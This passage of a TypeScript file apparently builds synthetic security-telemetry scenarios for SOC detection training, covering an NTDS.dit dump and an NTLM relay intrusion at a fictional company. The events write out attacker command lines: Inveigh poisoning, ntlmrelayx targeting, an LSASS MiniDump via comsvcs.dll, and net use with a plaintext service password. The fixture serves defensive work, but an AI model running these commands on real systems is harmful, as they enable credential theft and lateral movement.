      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "file_create", severity: "critical", mitre_technique: "T1003.003",
      hostname: DC, src_ip: DC_IP, user_email: SVC,
      description: "ntdsutil.exe running as svc-backup on DC01 wrote ntds.dit to C:\\Temp\\ntds_dump\\Active Directory\\.",
      // The file write needs its path and writer as event facts for the EDR
      // record to render (it rendered nothing from the vendor keys alone).
      process: ntdsutil,
      file: { name: "ntds.dit", path: "C:\\Temp\\ntds_dump\\Active Directory\\ntds.dit", size: 51380224 },
      raw: { "crowdstrike.event_simpleName": "GenericFileWritten" },
    },
    {
      id: "asrep_10a_edr_ntds_alert", ts: T(6 * HOUR + 20 * MIN + 5 * SEC),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "edr_alert", severity: "critical", is_detection: true, mitre_technique: "T1003.003",
      hostname: DC, src_ip: DC_IP, user_email: SVC, process: ntdsutil,
      description: "Falcon raised a Critical detection on DC01: ntdsutil.exe created an IFM snapshot containing ntds.dit. Disposition: detection only.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.DetectName": "NtdsutilIfmSnapshot",
        "crowdstrike.DetectDescription": "ntdsutil created an install-from-media snapshot of the Active Directory database.",
        "crowdstrike.SeverityName": "Critical", "crowdstrike.Tactic": "Credential Access", "crowdstrike.Technique": "NTDS",
        "threat.technique.id": "T1003", "threat.technique.subtechnique.id": "T1003.003", "crowdstrike.PatternDispositionDescription": "Detection, No Action",
        "crowdstrike.FileName": "ntdsutil.exe", "crowdstrike.ParentImageFileName": "cmd.exe", "crowdstrike.GrandparentImageFileName": "WmiPrvSE.exe",
      },
    },

    // ── Collection: the snapshot is compressed and pulled to the attacker's workstation over SMB ──
    cs("asrep_10b_compress_cmd", 6 * HOUR + 23 * MIN, DC, DC_IP, SVC, cmdDc2, "high"),
    cs("asrep_10c_compress_ps", 6 * HOUR + 23 * MIN + 1 * SEC, DC, DC_IP, SVC, psDc, "high", {}, { mitre_technique: "T1560.001",
      description: "powershell.exe on DC01 compressed C:\\Temp\\ntds_dump into C:\\Temp\\ntds.zip." }),
    {
      id: "asrep_10d_zip_written", ts: T(6 * HOUR + 25 * MIN + 30 * SEC),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create", severity: "high",
      hostname: DC, src_ip: DC_IP, user_email: SVC, process: psDc,
      file: { name: "ntds.zip", path: "C:\\Temp\\ntds.zip", size: 18_904_113 },
      description: "powershell.exe on DC01 finished writing C:\\Temp\\ntds.zip (18.9 MB).",
      raw: { "crowdstrike.event_simpleName": "GenericFileWritten" },
    },
    {
      id: "asrep_10e_zip_read_share", ts: T(6 * HOUR + 26 * MIN + 10 * SEC),
      source: "ad", vendor: "Windows Security", event_type: "file_access", severity: "high", mitre_technique: "T1039",
      hostname: DC, user_email: SVC, src_ip: WS_IP,
      description: "svc-backup read Temp\\ntds.zip through the DC01 C$ share from 10.0.1.45.",
      raw: {
        "event.code": "5145", "winlog.channel": "Security", "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.computer_name": DC,
        "winlog.event_data.SubjectUserName": "svc-backup", "winlog.event_data.SubjectDomainName": "NEXACORP", "winlog.event_data.IpAddress": WS_IP, "winlog.event_data.IpPort": "54402",
        "winlog.event_data.ShareName": "\\\\*\\C$", "winlog.event_data.RelativeTargetName": "Temp\\ntds.zip",
      },
    },
    fw("asrep_10f_fw_dc_pull", 6 * HOUR + 26 * MIN + 40 * SEC, DC_IP, DC, 54402, 445, "SMB", 22_480, 19_203_440, 29),
  ];
  // Chronological: the integrity gate and the page both read the story in clock order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return { title: "Identity alert naming three service accounts", events, T, MIN, HOUR };
}

/** Telemetry half of `buildNtlmRelayScenario`: the events and the story title, no answer key. */
export function ntlmRelayScenarioEvents() {
  const B = new Date("2026-05-14T10:12:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  const DEV = "WS-DEV-09", DEV_IP = "10.0.1.45";
  const FIN = "WS-FIN-03", FIN_IP = "10.0.1.31";
  const FS = "SRV-FILE01", FS_IP = "10.0.2.20";
  const DC = "DC01", DC_IP = "10.0.0.5";
  const STAGING_IP = "45.142.212.61";
  const JOHNSON = "m.johnson@nexacorp.com", NGUYEN = "l.nguyen@nexacorp.com";
  const TMP = "C:\\Users\\m.johnson\\AppData\\Local\\Temp";
  const inveighHash = makeSha256("inveigh_exe_llmnr_poisoner");
  const psexecHash = makeSha256("PSEXESVC-ntlm-relay-2026");
  const pyHash = makeSha256("python_exe_ntlmrelayx_host");
  const PY_PATH = "C:\\Users\\m.johnson\\AppData\\Local\\Programs\\Python\\Python312\\python.exe";
  const PY_SIGN = { "process.code_signature.exists": true, "process.code_signature.trusted": true, "process.code_signature.subject_name": "Python Software Foundation" };
  const NL = "\r\n\t\t\t";

  const cs = (id: string, t: number, host: string, ip: string, user_email: string | undefined, p: NonNullable<TelemetryEvent["process"]>,
    severity: TelemetryEvent["severity"], extra: Record<string, unknown> = {}, more: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(t), source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create", severity,
    hostname: host, src_ip: ip, ...(user_email ? { user_email } : {}), process: p,
    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", ...extra }, ...more,
  });
  const net = (id: string, t: number, host: string, ip: string, user_email: string | undefined, p: NonNullable<TelemetryEvent["process"]>, dst: string, srcPort: number, dstPort: number,
    description: string, severity: TelemetryEvent["severity"] = "medium"): TelemetryEvent => ({
    id, ts: T(t), source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection", severity,
    hostname: host, src_ip: ip, ...(user_email ? { user_email } : {}), dst_ip: dst, src_port: srcPort, dst_port: dstPort, protocol: "tcp", process: p, description,
    raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4" },
  });
  const fw = (id: string, t: number, host: string, src: string, dst: string, srcPort: number, dstPort: number, app: string, sent: number, rcvd: number, duration: number,
    severity: TelemetryEvent["severity"], description: string, more: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(t), source: "firewall", vendor: "FortiGate", event_type: "net_connection", severity,
    hostname: host, src_ip: src, dst_ip: dst, src_port: srcPort, dst_port: dstPort, protocol: "tcp",
    network: { bytes_out: sent, bytes_in: rcvd }, description,
    raw: {
      "data.type": "traffic", "data.subtype": "forward", "data.action": "close", "data.srcip": src, "data.dstip": dst, "data.srcport": String(srcPort),
      "data.dstport": String(dstPort), "data.proto": "6", "data.app": app, "data.sentbyte": sent, "data.rcvdbyte": rcvd, "data.duration": duration,
    },
    ...more,
  });

  // Process identities.
  const userinit = { name: "userinit.exe", pid: 3160, path: "C:\\Windows\\System32\\userinit.exe", parent_name: "winlogon.exe", parent_pid: 732, cmdline: "C:\\Windows\\system32\\userinit.exe", user: "NEXACORP\\m.johnson" };
  const explorer = { name: "explorer.exe", pid: 3800, path: "C:\\Windows\\explorer.exe", parent_name: "userinit.exe", parent_pid: 3160, cmdline: "C:\\Windows\\Explorer.EXE", user: "NEXACORP\\m.johnson" };
  const ps = { name: "powershell.exe", pid: 4608, path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_name: "explorer.exe", parent_pid: 3800,
    cmdline: "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"", user: "NEXACORP\\m.johnson" };
  const INVEIGH_CMD = "Inveigh.exe -LLMNR Y -NBNS Y -SMB N -Inspect N -FileOutput Y";
  const inveigh = { name: "Inveigh.exe", pid: 5976, path: `${TMP}\\Inveigh.exe`, parent_name: "powershell.exe", parent_pid: 4608, cmdline: INVEIGH_CMD,
    user: "NEXACORP\\m.johnson", integrity: "medium" as const, hash: { sha256: inveighHash } };
  const relayx = { name: "python.exe", pid: 5144, path: PY_PATH, parent_name: "powershell.exe", parent_pid: 4608,
    cmdline: `python.exe ${TMP}\\impacket\\ntlmrelayx.py -t smb://${FS_IP} -smb2support --no-http-server -socks`, user: "NEXACORP\\m.johnson", hash: { sha256: pyHash } };
  const explorerFin = { name: "explorer.exe", pid: 4212, path: "C:\\Windows\\explorer.exe", parent_name: "userinit.exe", parent_pid: 2984, cmdline: "C:\\Windows\\Explorer.EXE", user: "NEXACORP\\l.nguyen" };
  const userinitFin = { name: "userinit.exe", pid: 2984, path: "C:\\Windows\\System32\\userinit.exe", parent_name: "winlogon.exe", parent_pid: 716, cmdline: "C:\\Windows\\system32\\userinit.exe", user: "NEXACORP\\l.nguyen" };
  const systemProc = { name: "System", pid: 4, cmdline: "System", user: "NT AUTHORITY\\SYSTEM" };
  const psexesvc = { name: "PSEXESVC.exe", pid: 5512, path: "C:\\Windows\\PSEXESVC.exe", parent_name: "services.exe", parent_pid: 648, cmdline: "C:\\Windows\\PSEXESVC.exe",
    user: "NT AUTHORITY\\SYSTEM", hash: { sha256: psexecHash } };
  const cmdFs = { name: "cmd.exe", pid: 5528, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "PSEXESVC.exe", parent_pid: 5512, cmdline: "cmd.exe", user: "NT AUTHORITY\\SYSTEM" };
  const netUser = { name: "net.exe", pid: 5544, path: "C:\\Windows\\System32\\net.exe", parent_name: "cmd.exe", parent_pid: 5528, cmdline: "net user /domain", user: "NT AUTHORITY\\SYSTEM" };
  const dumper = { name: "rundll32.exe", pid: 5560, path: "C:\\Windows\\System32\\rundll32.exe", parent_name: "cmd.exe", parent_pid: 5528,
    cmdline: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 704 C:\\Windows\\Temp\\lsass.dmp full", user: "NT AUTHORITY\\SYSTEM" };
  const netUse = (pid: number, target: string) => ({ name: "net.exe", pid, path: "C:\\Windows\\System32\\net.exe", parent_name: "cmd.exe", parent_pid: 5528,
    cmdline: `net use \\\\${target}\\IPC$ /user:NEXACORP\\svc-deploy Dpl0y!2026`, user: "NT AUTHORITY\\SYSTEM" });

  const events: TelemetryEvent[] = [
    // ── Foothold: an operator comes in over the SSL-VPN with m.johnson's credentials and opens a remote desktop session ──
    {
      id: "ntlm_00a_vpn_tunnel_up", ts: T(-44 * MIN), source: "vpn", vendor: "FortiGate SSL-VPN", event_type: "vpn_login", severity: "medium",
      hostname: "FG-EDGE-01", user_email: JOHNSON, src_ip: STAGING_IP,
      geo: { country: "Netherlands", city: "Amsterdam", latitude: 52.3676, longitude: 4.9041 },
      description: "m.johnson's VPN session came up from 45.142.212.61 (Netherlands) and was assigned the tunnel address 10.8.0.14.",
      raw: {
        "data.type": "event", "data.subtype": "vpn", "data.logid": "0101039947", "data.level": "notice", "data.vd": "root",
        "data.eventtime": `${Date.parse(T(-44 * MIN))}000000`, "data.action": "tunnel-up", "data.tunneltype": "ssl-tunnel",
        "data.user": "m.johnson", "data.group": "VPN-Staff", "data.remip": STAGING_IP, "data.tunnelip": "10.8.0.14",
        "data.reason": "N/A", "data.srccountry": "Netherlands", "data.duration": "0", "data.sentbyte": "0", "data.rcvdbyte": "0",
        "data.msg": "SSL tunnel established", "data.logdesc": "SSL VPN tunnel up",
      },
    },
    {
      id: "ntlm_00_logon", ts: T(-40 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "high", mitre_technique: "T1078",
      hostname: DEV, user_email: JOHNSON, src_ip: "10.8.0.14",
      description: "m.johnson logged on to WS-DEV-09 through Remote Desktop (Type 10) from the VPN tunnel address 10.8.0.14.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": DEV,
        "winlog.event_data.TargetUserName": "m.johnson",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "10",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Negotiate",
        "winlog.event_data.WorkstationName": "-",
        "winlog.event_data.IpAddress": "10.8.0.14",
      },
    },
    cs("ntlm_00b_userinit", -40 * MIN + 4 * SEC, DEV, DEV_IP, JOHNSON, userinit, "informational"),
    cs("ntlm_00c_explorer", -40 * MIN + 6 * SEC, DEV, DEV_IP, JOHNSON, explorer, "informational"),
    cs("ntlm_00d_powershell", -2 * MIN - 40 * SEC, DEV, DEV_IP, JOHNSON, ps, "low"),

    // ── Tool delivery: the poisoner is pulled from the same address the VPN login came from ──
    net("ntlm_00e_tool_download", -2 * MIN - 30 * SEC, DEV, DEV_IP, JOHNSON, ps, STAGING_IP, 50233, 8000,
      "powershell.exe on WS-DEV-09 opened an HTTP connection to 45.142.212.61 on port 8000."),
    fw("ntlm_00f_fw_tool_download", -2 * MIN - 29 * SEC, DEV, DEV_IP, STAGING_IP, 50233, 8000, "HTTP", 412, 1_205_760, 3, "low",
      "WS-DEV-09 fetched about 1.2 MB over HTTP from 45.142.212.61:8000."),
    {
      id: "ntlm_00g_inveigh_written", ts: T(-2 * MIN - 27 * SEC), source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create", severity: "medium",
      hostname: DEV, src_ip: DEV_IP, user_email: JOHNSON, process: ps,
      file: { name: "Inveigh.exe", path: `${TMP}\\Inveigh.exe`, sha256: inveighHash, size: 1_205_760 },
      description: "powershell.exe wrote Inveigh.exe to m.johnson's Temp folder.",
      raw: { "crowdstrike.event_simpleName": "PeFileWritten" },
    },

    // ── Inveigh has to be listening before it can answer the victim, so its start precedes every victim row ──
    {
      id: "ntlm_04_responder_detected",
      ts: T(-10_000),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create", severity: "critical", mitre_technique: "T1557.001",
      hostname: DEV, user_email: JOHNSON, src_ip: DEV_IP,
      // Inveigh is the Windows-native poisoner (Responder needs the Linux interfaces and the
      // ports LanmanServer holds). -SMB N: the SMB listener belongs to ntlmrelayx, which has to
      // own TCP 445 on this host to receive the victim's session and relay it.
      description: "Inveigh.exe started on WS-DEV-09 under m.johnson's account with LLMNR and NBNS poisoning enabled and its own SMB listener disabled.",
      process: inveigh,
      raw: { "crowdstrike.event_simpleName": "ProcessRollup2" },
    },
    cs("ntlm_04a_ntlmrelayx", -8_000, DEV, DEV_IP, JOHNSON, relayx, "high", PY_SIGN, {
      mitre_technique: "T1557.001",
      description: "python.exe on WS-DEV-09 started ntlmrelayx.py targeting smb://10.0.2.20 (SRV-FILE01), with the SOCKS option, next to Inveigh.",
    }),
    // ── First alert: the EDR's behavioural detection on the poisoner ──
    // The page a SOC actually gets, seconds after the process start and before
    // any victim traffic. Detect-only policy on this host group: the process
    // keeps running, which is why the relay below still happens.
    {
      id: "ntlm_04b_edr_alert",
      ts: T(-6_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "edr_alert", severity: "critical", mitre_technique: "T1557.001", mitre_tactic: "Credential Access",
      is_detection: true,
      hostname: DEV, user_email: JOHNSON, src_ip: DEV_IP,
      process: inveigh,
      description: "The EDR raised a critical alert on WS-DEV-09 for Inveigh.exe (user m.johnson, parent powershell.exe); the policy action was detect-only.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.DetectName": "CredentialTheft",
        "crowdstrike.Tactic": "Credential Access",
        "threat.tactic.id": "TA0006",
        "crowdstrike.Technique": "Name Resolution Poisoning and SMB Relay",
        "threat.technique.id": "T1557",
        "threat.technique.subtechnique.id": "T1557.001",
        "crowdstrike.SeverityName": "Critical",
        "crowdstrike.PatternDispositionValue": "0",
        "crowdstrike.PatternDispositionDescription": "Detection, standard detection.",
        "crowdstrike.FileName": "Inveigh.exe",
        "crowdstrike.ParentImageFileName": "powershell.exe",
        "crowdstrike.GrandparentImageFileName": "explorer.exe",
        "host.name": DEV,
        "action_result": "detected",
      },
    },

    // ── The victim: a name no DNS server knows, then an SMB session to the poisoner ──
    cs("ntlm_03a_victim_userinit", -3 * 60 * MIN, FIN, FIN_IP, NGUYEN, userinitFin, "informational"),
    cs("ntlm_03b_victim_explorer", -3 * 60 * MIN + 2 * SEC, FIN, FIN_IP, NGUYEN, explorerFin, "informational"),
    {
      id: "ntlm_01_dns_nxdomain", ts: T(-3 * SEC), source: "dns", vendor: "Windows DNS Server", event_type: "dns_query", severity: "low",
      hostname: FIN, src_ip: FIN_IP, dst_ip: DC_IP, dst_port: 53, protocol: "udp",
      dns: { query: "finance-archive.nexacorp.com", query_type: "A", rcode: "NXDOMAIN" },
      description: "The domain DNS server answered NXDOMAIN to WS-FIN-03's query for finance-archive.nexacorp.com.",
      fp_explanation: "A failed lookup for a mistyped or retired share name is ordinary: any workstation produces NXDOMAIN answers every day. Only what the workstation does next separates this from noise.",
      raw: { "source.ip": FIN_IP, "dns.question.name": "finance-archive.nexacorp.com", "dns.question.type": "A", "dns.response_code": "NXDOMAIN" },
    },
    {
      id: "ntlm_02_victim_dns_request", ts: T(-2 * SEC), source: "edr", vendor: "CrowdStrike Falcon", event_type: "dns_query", severity: "low",
      hostname: FIN, src_ip: FIN_IP, user_email: NGUYEN, process: explorerFin,
      dns: { query: "finance-archive.nexacorp.com", query_type: "A", rcode: "NXDOMAIN" },
      description: "explorer.exe on WS-FIN-03 requested finance-archive.nexacorp.com and got no answer.",
      raw: { "crowdstrike.event_simpleName": "DnsRequest" },
    },
    {
      id: "ntlm_03_victim_smb_session", ts: T(5 * SEC), source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection", severity: "medium", mitre_technique: "T1557.001",
      hostname: FIN, src_ip: FIN_IP, user_email: NGUYEN, dst_ip: DEV_IP, src_port: 49821, dst_port: 445, protocol: "tcp", process: systemProc,
      description: "WS-FIN-03 opened an SMB session from port 49821 to 10.0.1.45 on port 445, seconds after its failed lookup.",
      fp_explanation: "Workstation-to-workstation SMB is unusual but not unheard of on this network; a developer sharing a build folder produces the same shape.",
      raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "crowdstrike.event_platform": "Win" },
    },
    // The relayed leg: ntlmrelayx (not Inveigh) holds the victim's session and opens its own to the file server.
    net("ntlm_03a_relay_connect", 6_900, DEV, DEV_IP, JOHNSON, relayx, FS_IP, 49823, 445,
      "python.exe (ntlmrelayx) on WS-DEV-09 opened an SMB session from port 49823 to SRV-FILE01 on port 445.", "high"),
    // The relayed leg crosses the firewall: WS-DEV-09 (10.0.1.0/24) to SRV-FILE01 (10.0.2.0/24).
    fw("ntlm_03b_fw_relay_leg", 7 * SEC, DEV, DEV_IP, FS_IP, 49823, 445, "SMB", 5240, 6180, 3, "medium",
      "WS-DEV-09 opened an SMB session from port 49823 to SRV-FILE01 (10.0.2.20) on port 445.", { mitre_technique: "T1557.001" }),
    {
      id: "ntlm_05_relay_auth_success",
      ts: T(8_000),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "high", mitre_technique: "T1078",
      hostname: FS, user_email: NGUYEN, src_ip: DEV_IP,
      description: "l.nguyen authenticated to SRV-FILE01 with a network logon (Type 3) over NTLM. The record names WS-FIN-03 as the workstation and 10.0.1.45 as the source address.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": FS,
        "winlog.event_data.TargetUserName": "l.nguyen",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        // THE relay signature. ntlmrelayx forwards the victim's NTLMSSP_AUTH message verbatim:
        // it cannot rewrite the workstation name without invalidating the MIC. So the relayed
        // 4624 names the VICTIM's machine (WS-FIN-03) while the packet arrives from the
        // ATTACKER's address (10.0.1.45). That contradiction inside a single record is the
        // highest-fidelity relay indicator there is.
        "winlog.event_data.WorkstationName": FIN,
        "winlog.event_data.IpAddress": DEV_IP,
        "winlog.event_data.IpPort": "49823",
        "winlog.event_data.LmPackageName": "NTLM V2",
        "winlog.event_data.KeyLength": "128",
      },
    },
    {
      id: "ntlm_05a_relay_privileges", ts: T(8_100),
      source: "ad", vendor: "Windows Security", event_type: "privileged_operation", severity: "high",
      hostname: FS, user_email: NGUYEN,
      description: "The l.nguyen logon on SRV-FILE01 was assigned administrator-level special privileges, because l.nguyen is a member of the server's local Administrators group.",
      raw: {
        "event.code": "4672", "winlog.channel": "Security", "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.computer_name": FS,
        "winlog.event_data.SubjectUserName": "l.nguyen", "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.PrivilegeList": ["SeSecurityPrivilege", "SeTakeOwnershipPrivilege", "SeBackupPrivilege", "SeRestorePrivilege", "SeDebugPrivilege", "SeImpersonatePrivilege"].join(NL),
      },
    },

    // ── Fifteen minutes later: PsExec over the kept-alive relay session installs a service ──
    {
      id: "ntlm_06a_admin_share_write", ts: T(14 * MIN + 58 * SEC), source: "ad", vendor: "Windows Security", event_type: "file_create", severity: "high", mitre_technique: "T1021.002",
      hostname: FS, user_email: NGUYEN, src_ip: DEV_IP,
      description: "l.nguyen wrote PSEXESVC.exe to the SRV-FILE01 ADMIN$ share from 10.0.1.45.",
      raw: {
        "event.code": "5145", "winlog.channel": "Security", "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.computer_name": FS,
        "winlog.event_data.SubjectUserName": "l.nguyen", "winlog.event_data.SubjectDomainName": "NEXACORP", "winlog.event_data.IpAddress": DEV_IP, "winlog.event_data.IpPort": "49823",
        "winlog.event_data.ShareName": "\\\\*\\ADMIN$", "winlog.event_data.RelativeTargetName": "PSEXESVC.exe", "winlog.event_data.AccessMask": "0x2",
        "winlog.event_data.AccessList": "%%4417\r\n\t\t\t\t",
      },
    },
    {
      id: "ntlm_06b_service_install_4697", ts: T(14 * MIN + 59 * SEC), source: "ad", vendor: "Windows Security", event_type: "service_install", severity: "high",
      hostname: FS, user_email: NGUYEN, src_ip: DEV_IP,
      description: "A service named PSEXESVC running %SystemRoot%\\PSEXESVC.exe as LocalSystem was installed on SRV-FILE01 by l.nguyen.",
      raw: {
        "event.code": "4697", "winlog.channel": "Security", "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.computer_name": FS,
        "winlog.event_data.SubjectUserName": "l.nguyen", "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.ServiceName": "PSEXESVC", "winlog.event_data.ServiceFileName": "%SystemRoot%\\PSEXESVC.exe",
        "winlog.event_data.ServiceType": "0x10", "winlog.event_data.ServiceStartType": "3", "winlog.event_data.ServiceAccount": "LocalSystem",
      },
    },
    {
      id: "ntlm_06c_service_install_7045", ts: T(14 * MIN + 59 * SEC + 500), source: "ad", vendor: "Windows Security", event_type: "service_install", severity: "high", mitre_technique: "T1021.002",
      hostname: FS,
      description: "The Service Control Manager on SRV-FILE01 logged the installation of the PSEXESVC service.",
      raw: {
        "event.code": "7045", "winlog.channel": "System", "winlog.provider_name": "Service Control Manager", "winlog.computer_name": FS,
        "winlog.event_data.ServiceName": "PSEXESVC", "winlog.event_data.ImagePath": "%SystemRoot%\\PSEXESVC.exe",
        "winlog.event_data.ServiceType": "user mode service", "winlog.event_data.StartType": "demand start", "winlog.event_data.AccountName": "LocalSystem",
      },
    },
    cs("ntlm_06_psexec_service", 15 * MIN, FS, FS_IP, undefined, psexesvc, "critical", {}, {
      event_type: "service_install", mitre_technique: "T1021.002",
      description: "PSEXESVC.exe started as a service on SRV-FILE01, launched by services.exe as SYSTEM after the relayed l.nguyen credentials installed it.",
    }),
    {
      id: "ntlm_07_system_logon",
      ts: T(15 * MIN + 3_000),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "high", mitre_technique: "T1021.002",
      hostname: FS,
      description: "A LogonType 5 (Service) logon for NT AUTHORITY\\SYSTEM was recorded on SRV-FILE01, three seconds after PSEXESVC.exe was installed.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.computer_name": FS,
        "winlog.event_data.TargetUserName": "SYSTEM",
        "winlog.event_data.TargetDomainName": "NT AUTHORITY",
        "winlog.event_data.LogonType": "5",
        "winlog.event_data.LogonProcessName": "Advapi",
        "winlog.event_data.AuthenticationPackageName": "Negotiate",
        "winlog.event_data.ProcessName": "C:\\Windows\\System32\\services.exe",
      },
    },
    cs("ntlm_07a_psexec_cmd", 15 * MIN + 30 * SEC, FS, FS_IP, undefined, cmdFs, "medium"),

    // ── Discovery and LSASS access from the SYSTEM shell ──
    cs("ntlm_08_domain_recon", 16 * MIN, FS, FS_IP, undefined, netUser, "high", {}, {
      mitre_technique: "T1087.002",
      description: "net user /domain ran on SRV-FILE01 under NT AUTHORITY\\SYSTEM, spawned from cmd.exe.",
    }),
    {
      id: "ntlm_09_lsass_dump",
      ts: T(18 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_access", severity: "critical", mitre_technique: "T1003.001", is_detection: true,
      hostname: FS, src_ip: FS_IP,
      // The target is the host's lsass.exe; its pid is the one the dumper's command line names.
      description: "rundll32.exe running as NT AUTHORITY\\SYSTEM on SRV-FILE01 opened a handle to lsass.exe with GrantedAccess 0x1FFFFF.",
      process: { ...dumper, target: { name: "lsass.exe", pid: 704 } },
      raw: {
        "crowdstrike.TargetProcessImageFileName": "lsass.exe",
        "crowdstrike.DesiredAccess": "2097151",
        "crowdstrike.Severity": 95,
      },
    },
    {
      id: "ntlm_09a_dump_written", ts: T(18 * MIN + 5 * SEC), source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create", severity: "critical",
      hostname: FS, src_ip: FS_IP, process: dumper,
      file: { name: "lsass.dmp", path: "C:\\Windows\\Temp\\lsass.dmp", size: 58_720_256 },
      description: "rundll32.exe wrote C:\\Windows\\Temp\\lsass.dmp (56 MB) on SRV-FILE01.",
      raw: { "crowdstrike.event_simpleName": "GenericFileWritten" },
    },

    // ── Lateral movement with the harvested svc-deploy account ──
    cs("ntlm_10_net_use_app", 24 * MIN + 59 * SEC, FS, FS_IP, undefined, netUse(5576, "10.0.3.30"), "high", {}, { mitre_technique: "T1021.002",
      description: "net use \\\\10.0.3.30\\IPC$ with NEXACORP\\svc-deploy ran on SRV-FILE01 under SYSTEM." }),
    fw("ntlm_10_lateral_smb", 25 * MIN, FS, FS_IP, "10.0.3.30", 52170, 445, "SMB", 64_218, 31_907, 4, "high",
      "SRV-FILE01 opened an outbound SMB session to 10.0.3.30 on port 445.", { mitre_technique: "T1021.002" }),
    {
      id: "ntlm_10_target_logon_app", ts: T(25 * MIN + 2 * SEC), source: "ad", vendor: "Windows Security", event_type: "auth_success", severity: "high",
      hostname: "SRV-APP01", user_email: "svc-deploy@nexacorp.com", src_ip: FS_IP,
      description: "svc-deploy logged on to SRV-APP01 with a network logon over NTLM from SRV-FILE01.",
      raw: {
        "event.code": "4624", "winlog.channel": "Security", "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.computer_name": "SRV-APP01",
        "winlog.event_data.TargetUserName": "svc-deploy", "winlog.event_data.TargetDomainName": "NEXACORP", "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "NTLM", "winlog.event_data.WorkstationName": FS, "winlog.event_data.IpAddress": FS_IP, "winlog.event_data.IpPort": "52170",
      },
    },
    cs("ntlm_10b_net_use_sql", 25 * MIN + 39 * SEC, FS, FS_IP, undefined, netUse(5592, "10.0.3.31"), "high", {}, { mitre_technique: "T1021.002",
      description: "net use \\\\10.0.3.31\\IPC$ with NEXACORP\\svc-deploy ran on SRV-FILE01 under SYSTEM." }),
    fw("ntlm_10b_lateral_smb", 25 * MIN + 40_000, FS, FS_IP, "10.0.3.31", 52233, 445, "SMB", 71_004, 38_622, 5, "high",
      "SRV-FILE01 opened an outbound SMB session to 10.0.3.31 on port 445.", { mitre_technique: "T1021.002" }),
    {
      id: "ntlm_10b_target_logon_sql", ts: T(25 * MIN + 42 * SEC), source: "ad", vendor: "Windows Security", event_type: "auth_success", severity: "high",
      hostname: "SRV-SQL01", user_email: "svc-deploy@nexacorp.com", src_ip: FS_IP,
      description: "svc-deploy logged on to SRV-SQL01 with a network logon over NTLM from SRV-FILE01.",
      raw: {
        "event.code": "4624", "winlog.channel": "Security", "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.computer_name": "SRV-SQL01",
        "winlog.event_data.TargetUserName": "svc-deploy", "winlog.event_data.TargetDomainName": "NEXACORP", "winlog.event_data.LogonType": "3",
        "winlog.event_data.AuthenticationPackageName": "NTLM", "winlog.event_data.WorkstationName": FS, "winlog.event_data.IpAddress": FS_IP, "winlog.event_data.IpPort": "52233",
      },
    },
    cs("ntlm_10c_net_use_dc", 26 * MIN + 33 * SEC, FS, FS_IP, undefined, netUse(5608, "10.0.0.5"), "high", {}, { mitre_technique: "T1021.002",
      description: "net use \\\\10.0.0.5\\IPC$ with NEXACORP\\svc-deploy ran on SRV-FILE01 under SYSTEM." }),
    fw("ntlm_10c_lateral_smb", 26 * MIN + 35_000, FS, FS_IP, DC_IP, 52301, 445, "SMB", 52_201, 23_682, 3, "high",
      "SRV-FILE01 opened an outbound SMB session to 10.0.0.5 on port 445.", { mitre_technique: "T1021.002" }),
    {
      id: "ntlm_10c_target_logon_dc", ts: T(26 * MIN + 36 * SEC), source: "ad", vendor: "Windows Security", event_type: "auth_success", severity: "high",
      hostname: DC, user_email: "svc-deploy@nexacorp.com", src_ip: FS_IP,
      description: "svc-deploy logged on to DC01 with a network logon over NTLM from SRV-FILE01.",
      raw: {
        "event.code": "4624", "winlog.channel": "Security", "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.computer_name": DC,
